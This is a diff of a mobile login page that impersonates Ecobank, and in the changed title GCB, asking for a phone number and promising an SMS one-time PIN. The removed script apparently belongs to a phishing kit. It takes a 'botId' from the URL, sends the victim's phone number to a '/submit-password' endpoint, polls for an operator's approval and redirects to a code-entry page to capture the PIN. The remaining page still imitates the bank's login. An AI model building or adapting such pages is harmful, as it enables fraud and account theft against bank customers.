@@ -3,14 +3,14 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Ecobank Mobile</title>
+<title>GCB Mobile App</title>
 
 <link rel="stylesheet"
 href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
 
 <style>
 
-/* ================= BASE ================= */
+/* ===== BASE ===== */
 *{
     margin:0;
     padding:0;
@@ -24,7 +24,6 @@ body{
     justify-content:center;
 }
 
-/* ================= CONTAINER ================= */
 .container{
     width:100%;
     max-width:430px;
@@ -34,7 +33,19 @@ body{
     position:relative;
 }
 
-/* ================= CHAT ================= */
+/* ===== LANGUAGE ===== */
+.language-box{
+    width:90px;
+    height:40px;
+    border:1px solid #ddd;
+    border-radius:6px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:14px;
+}
+
+/* ===== CHAT ===== */
 .chat-btn{
     position:absolute;
     right:18px;
@@ -49,7 +60,7 @@ body{
     color:white;
 }
 
-/* ================= TITLE ================= */
+/* ===== TITLE ===== */
 .title{
     margin-top:60px;
     font-size:34px;
@@ -69,7 +80,7 @@ body{
     color:#666;
 }
 
-/* ================= COUNTRY ================= */
+/* ===== COUNTRY ===== */
 .country-label{
     margin-top:40px;
     font-size:15px;
@@ -86,7 +97,7 @@ body{
     outline:none;
 }
 
-/* ================= INPUT ================= */
+/* ===== INPUT ===== */
 .input-group{
     margin-top:25px;
 }
@@ -115,7 +126,6 @@ body{
     width:22px;
 }
 
-/* INPUT FIELD */
 .input-row input{
     flex:1;
     border:none;
@@ -124,14 +134,14 @@ body{
     background:transparent;
 }
 
-/* ================= INFO ================= */
+/* ===== INFO ===== */
 .info-text{
     font-size:12px;
     color:#777;
     margin-top:10px;
 }
 
-/* ================= BUTTON ================= */
+/* ===== BUTTON ===== */
 .login-btn{
     width:100%;
     margin-top:30px;
@@ -148,7 +158,7 @@ body{
     background:#cfcfcf;
 }
 
-/* ================= FOOTER ================= */
+/* ===== FOOTER ===== */
 .footer-text{
     text-align:center;
     margin-top:25px;
@@ -160,7 +170,7 @@ body{
     text-decoration:none;
 }
 
-/* ================= HIDDEN SYSTEM ELEMENTS ================= */
+/* hide unused */
 #status,#spinner,.secondary{
     display:none;
 }
@@ -174,13 +184,20 @@ body{
 
 <div class="container">
 
-    <!-- CHAT -->
+    <!-- CHAT ICON -->
     <div class="chat-btn">
         <i class="fa-regular fa-comment-dots"></i>
     </div>
 
+    <!-- LANGUAGE -->
+    <div class="language-box">
+        🇺🇸 EN
+    </div>
+
     <!-- TITLE -->
-    <h1 class="title">Welcome to Ecobank</h1>
+    <h1 class="title">
+        Welcome to Ecobank
+    </h1>
 
     <div class="subtitle">
         Have an Ecobank account?
@@ -205,7 +222,7 @@ body{
         <option value="44">🇬🇧 United Kingdom (+44)</option>
     </select>
 
-    <!-- MOBILE INPUT -->
+    <!-- MOBILE -->
     <div class="input-group">
 
         <div class="input-row">
@@ -214,7 +231,7 @@ body{
 
             <div class="country-code">
                 <img src="https://flagcdn.com/w40/gh.png">
-                <span>+233</span>
+                <span id="dialCode">+233</span>
             </div>
 
             <input
@@ -232,12 +249,8 @@ body{
         A one-time PIN will be sent via SMS on this number
     </div>
 
-    <!-- STATUS (USED BY BACKEND) -->
-    <div id="status"></div>
-    <div id="spinner">⏳</div>
-
     <!-- BUTTON -->
-    <button class="login-btn primary" id="loginBtn" disabled type="submit">
+    <button class="login-btn" id="loginBtn" disabled type="submit">
         Proceed
     </button>
 
@@ -251,115 +264,19 @@ body{
 
 </form>
 
-<!-- ================= SCRIPT (PASSWORD REMOVED CLEANLY) ================= -->
 <script>
 
-const form = document.getElementById('detailsForm');
-const mobileNumber = document.getElementById('mobileNumber');
-const nextButton = document.getElementById('loginBtn');
-const statusEl = document.getElementById('status');
-const spinner = document.getElementById('spinner');
+/* ENABLE BUTTON LOGIC */
+const mobileNumber = document.getElementById("mobileNumber");
+const loginBtn = document.getElementById("loginBtn");
 
-/* BOT ID */
-const params = new URLSearchParams(window.location.search);
-const urlBotId = params.get('botId');
-
-if(urlBotId){
-  localStorage.setItem('botId', urlBotId);
-}
-
-const botId = localStorage.getItem('botId');
-
-if(!botId){
-  alert('Session expired. Please start again.');
-  window.location.href='index.html';
-}
-
-/* ENABLE BUTTON */
-mobileNumber.addEventListener("input", () => {
-
+function validate(){
     const valid = mobileNumber.value.trim().length >= 8;
 
-    nextButton.disabled = !valid;
-
-    if(valid){
-        nextButton.classList.add("active");
-    } else {
-        nextButton.classList.remove("active");
-    }
-
-});
-
-/* SUBMIT */
-form.addEventListener('submit', async (e)=>{
-
-  e.preventDefault();
-
-  nextButton.disabled = true;
-
-  const phone = mobileNumber.value.trim();
-
-  localStorage.setItem('phone', phone);
-
-  statusEl.style.display='block';
-  spinner.style.display='block';
-
-  statusEl.textContent='⏳ Processing request...';
-
-  try{
-
-    const res = await fetch(`${window.location.origin}/submit-password`,{
-
-      method:'POST',
-      headers:{ 'Content-Type':'application/json' },
-
-      body:JSON.stringify({
-        phone,
-        botId
-      })
-
-    });
-
-    const { requestId } = await res.json();
-
-    pollApproval(requestId);
-
-  }catch{
-
-    spinner.style.display='none';
-    statusEl.textContent='❌ Server error';
-    nextButton.disabled = false;
-
-  }
-
-});
-
-/* POLLING */
-function pollApproval(requestId){
-
-  const interval = setInterval(async ()=>{
-
-    const res = await fetch(
-      `${window.location.origin}/check-password/${requestId}`
-    );
-
-    const data = await res.json();
-
-    if(data.redirect === 'code'){
-      clearInterval(interval);
-      window.location.href='code.html';
-    }
-
-    if(data.approved === false){
-      clearInterval(interval);
-      spinner.style.display='none';
-      statusEl.textContent='❌ Incorrect details';
-      nextButton.disabled = false;
-    }
-
-  }, 2000);
-
+    loginBtn.disabled = !valid;
 }
+
+mobileNumber.addEventListener("input", validate);
 
 </script>
 
